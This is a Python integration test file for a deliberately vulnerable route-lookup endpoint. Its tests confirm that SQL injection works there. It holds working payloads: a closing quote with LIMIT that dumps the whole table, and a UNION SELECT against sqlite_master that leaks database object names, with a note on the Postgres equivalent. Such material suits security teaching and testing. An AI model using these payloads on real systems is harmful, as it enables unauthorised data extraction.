"""
Integration tests for the deliberately vulnerable GET /routes/inject/{name}.

These assert the injection *succeeds* — the endpoint interpolates `name` straight
into a LIKE clause, so escaping the filter is the documented behaviour here, not
a bug for these tests to catch.

Payloads target SQLite, since that is what the integration DB runs on (see
conftest.py). The Postgres equivalent of the table-list payload swaps
sqlite_master for information_schema.tables.
"""

import pytest
from sqlalchemy import text

SEEDED = 3
ORIGIN = (-20.0, -30.0)  # isolated point, unused elsewhere in the test suite


@pytest.fixture(scope="module")
def total_routes(client, auth_token, db_engine):
    """Seeds a few named routes and returns the total row count in `routes`."""
    for i in range(SEEDED):
        client.post(
            "/routes/",
            json={"name": f"inject_route_{i}", "lat": ORIGIN[0], "lon": ORIGIN[1]},
            headers={"token": auth_token},
        )
    with db_engine.connect() as conn:
        return conn.execute(text("SELECT count(*) FROM routes")).scalar()


@pytest.fixture(scope="module")
def sqlite_master_rows(db_engine):
    with db_engine.connect() as conn:
        return conn.execute(
            text("SELECT count(*) FROM (SELECT DISTINCT name FROM sqlite_master)")
        ).scalar()


def test_injection_dumps_every_row(client, total_routes):
    """A closing quote plus LIMIT escapes the name filter and returns the table."""
    legit = client.get("/routes/inject/inject_route_0")
    assert legit.status_code == 200
    assert len(legit.json()) == 1

    injected = client.get("/routes/inject/' LIMIT 100;--")
    assert injected.status_code == 200
    assert len(injected.json()) == total_routes
    assert len(injected.json()) > len(legit.json())


def test_injection_leaks_table_names(client, total_routes, sqlite_master_rows):
    """A UNION against the schema catalogue returns one row per DB object.

    The name is chosen to match nothing, so every row comes from sqlite_master.
    The endpoint returns `result.scalars()`, so only the first column survives —
    the leak shows up as row count rather than readable names.
    """
    assert total_routes > 0
    assert client.get("/routes/inject/notarealroutename").status_code == 404

    payload = (
        "notarealroutename' UNION SELECT 0, name, 0, 0, '', '' FROM sqlite_master--"
    )
    response = client.get(f"/routes/inject/{payload}")

    assert response.status_code == 200
    assert len(response.json()) == sqlite_master_rows
